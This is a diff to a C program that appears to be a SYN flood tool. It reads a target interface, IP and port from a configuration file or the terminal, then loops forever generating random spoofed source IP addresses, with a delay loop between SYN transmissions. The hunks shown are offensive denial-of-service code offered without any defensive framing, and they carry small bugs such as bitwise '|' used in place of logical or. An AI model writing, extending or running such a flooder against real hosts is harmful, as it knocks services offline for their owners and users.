@@ -96,31 +96,71 @@ int check_IP(char *IP){
  
 int main (void)
 {
+    FILE *file;		//To store created IP numbers.
+    file=fopen("IPNumbersCreated.txt","w");
+
+    FILE *interfaceFile;//To store interface knowledge.
+    interfaceFile=fopen("interface.conf","w");
+
     int integerIP=67;	//To create random source IPs.
     char stringIP[3];
     int sourcePort;
 
-    int count=0;
-       
-    FILE *file;		//To store created IP numbers.
-    file=fopen("IPNumbersCreated.txt","w");
+    int count=0;	//To hold how many IP's are created.
+   
+    srand(time(NULL));	//Setting the seed for random creation.
+    
+    char intface[20];	//To hold interface through which attack is happening.
 
+    char dIP[16];	//To specify which IP and port to attack.
+    int destPort;
 
-    //Accepting interface name fron the user and writing it to a .conf file.
-    char intface[20];
-    FILE *interfaceFile;
-    interfaceFile=fopen("interface.conf","w");
+    char choice;
+    printf("How do you configure your attack? (C/c for configuration file, T/t for terminal): ");
+    scanf("%c", &choice);
 
-    printf("Enter interface to send packets through: ");
-    fgets(intface, 20, stdin);
+if(choice=='c'|choice=='C'){
+    FILE *fp;
+    fp=fopen("configuration.conf","r");
+
+    char buff[50];
+    char sdestPort[20];
+
+    for(int i=0;i<3;i++){
+	fscanf(fp,"%s",buff);
+    }
+    strcpy(intface,buff);
+    printf("Interface name: %s\n", buff);
     fprintf(interfaceFile, "%s\n", intface);
     fclose(interfaceFile);
-  
-    //To accept destination IP address and port number from the user. 
-    char dIP[16];
+
+    for(int i=0;i<3;i++){
+	fscanf(fp,"%s",buff);
+    }
+    strcpy(dIP,buff);
+    printf("Destination IP: %s\n", buff);
+
+    for(int i=0;i<3;i++){
+	fscanf(fp,"%s",buff);
+    }
+    strcpy(sdestPort,buff);
+    destPort=atoi(sdestPort);
+    printf("Destination Port: %s\n", buff);
+
+    fclose(fp);
+}
+
+else if(choice=='T'|choice=='t'){
+
+    //Accepting interface information from the user.
+    printf("Enter interface to send packets through: ");
+    scanf("%s",intface);
+    fprintf(interfaceFile, "%s\n", intface);
+    fclose(interfaceFile);
+
     char pseudodIP[16]; 
-    int destPort;
- 
+
+    //Accepting destination IP address from the user.
     printf("Enter IP number to attack: ");
     fgets(dIP, 16, stdin);
 
@@ -132,17 +172,16 @@ int main (void)
        strcpy(pseudodIP,dIP); 
     }
 
+    //Accepting destination port number from the user.
     printf("Enter destination port number: ");
     scanf("%d",&destPort);
 
     //Demonstration of destionation IP address and port number.
-    printf("IP Number: ");
-    puts(dIP);
+    printf("/******************/\nIP Number: ");
+    printf("%s",dIP);
     printf("Port Number: %d\n",destPort);
 
-    //Setting the seed for random creation.
-    srand(time(NULL));
-
+}
     //Uncomment in case of creating a certain number of IP addresses.
 /*  
     int numToCreate;
@@ -179,11 +218,10 @@ while(1)
     integerIP=1+(rand()%254);  //creating random IP numbers.
 
     //Uncomment in case of excluding a certain IP number from created IP addresses.
-/*
-    while(integerIP==67){
+
+    while(integerIP==222){
 	integerIP=1+(rand()%254);
     }
-*/
 
     //Adding created integer to source host address.
     int length = snprintf( NULL, 0, "%d", integerIP );
@@ -282,13 +320,11 @@ while(1)
 
 
     //To delay SYN transmission (with consuming OS' clock)    
-/*
+
     for(int j=0;j<150;j++){
 	for(int k=0;k<150;k++){
 	}
     }
-*/
-
 } 
     printf("Number of IP addresses created: %d\n",count);
     fclose(file); 
